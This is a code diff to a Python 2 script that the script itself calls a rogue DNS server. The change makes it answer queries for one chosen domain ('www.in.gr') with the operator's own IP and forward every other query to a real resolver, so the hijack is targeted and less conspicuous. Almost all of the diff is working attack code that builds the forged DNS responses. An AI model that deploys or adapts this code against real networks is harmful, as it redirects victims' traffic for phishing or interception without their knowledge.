@@ -30,15 +30,16 @@ import socket
 import threading
 import thread
 import time
-global Domain_Name,sleeptime
-Domain_Name="www.google.com"#Your domain name
+global Domain_Name,sleeptime,spoofed_domain
+My_Domain_Name="www.mydomainname.com"#Your domain name
+spoofed_domain="www.in.gr"
 sleeptime=600 #DNS refresh interval in seconds. This is usefull when you are not on static ip plan by your ISP 600 = 10mins
 global ip
 
-def resolve_dn():
-  dataip = socket.gethostbyname_ex(Domain_Name) 
+def resolve_dn(domain_name):
+  dataip = socket.gethostbyname_ex(domain_name) 
   ip = str(dataip[2][0]).strip("[] '")      
-  print  "Resolving Domain [%s]->[%s]" %( Domain_Name ,  ip  )
+  print  "Resolving Domain [%s]->[%s]" %( domain_name ,  ip  )
   return ip
 
 def run_thread (threadname, sleeptime):
@@ -49,7 +50,7 @@ def run_thread (threadname, sleeptime):
     while 1:      
       time.sleep(sleeptime) 
       threadlock.acquire()
-      resolve_dn()
+      resolve_dn(My_Domain_Name)
       threadlock.release()
       
   except: 
@@ -72,21 +73,33 @@ class DNSQuery:
 
   def respuesta(self, ip):
     packet=''
-    if self.dominio:
+    if self.dominio[:-1]==spoofed_domain:
       packet+=self.data[:2] + "\x81\x80"
       packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
       packet+=self.data[12:]                                         # Original Domain Name Question
       packet+='\xc0\x0c'                                             # Pointer to domain name
       packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
       packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
+      print 'Spoofing: [%s] -> [%s]' % (self.dominio[:-1], ip)
+    
+    else: 
+      self.ip=resolve_dn(self.dominio[:-1])
+      packet+=self.data[:2] + "\x81\x80"
+      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
+      packet+=self.data[12:]                                         # Original Domain Name Question
+      packet+='\xc0\x0c'                                             # Pointer to domain name
+      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
+      packet+=str.join('',map(lambda x: chr(int(x)), self.ip.split('.'))) # 4bytes of IP
+      print 'Normal Request of: [%s] -> [%s]' % (self.dominio[:-1],resolve_dn(self.dominio[:-1]))
     return packet
+   
 
 if __name__ == '__main__':  
   #If you want static IP for your server then modify and uncomment the line below
   #ip='192.168.1.1'
   #from threading import Timer
-  print  "Staring Rogue Dns Server for [%s]" % Domain_Name 
-  ip=resolve_dn()  
+  print  "Staring Rogue Dns Server for [%s]" % My_Domain_Name
+  ip=resolve_dn(My_Domain_Name)  #modify here for static ip
   activethreads = 1
   threadlock = thread.allocate_lock()  
   thread.start_new_thread(run_thread, ("DnsResolver", sleeptime)) 
@@ -98,7 +111,7 @@ if __name__ == '__main__':
       data, addr = udps.recvfrom(1024)
       p=DNSQuery(data)
       udps.sendto(p.respuesta(ip), addr)
-      print 'Spoofing: [%s] -> [%s]' % (p.dominio, ip)
+      
       
   except  KeyboardInterrupt:
     udps.close()
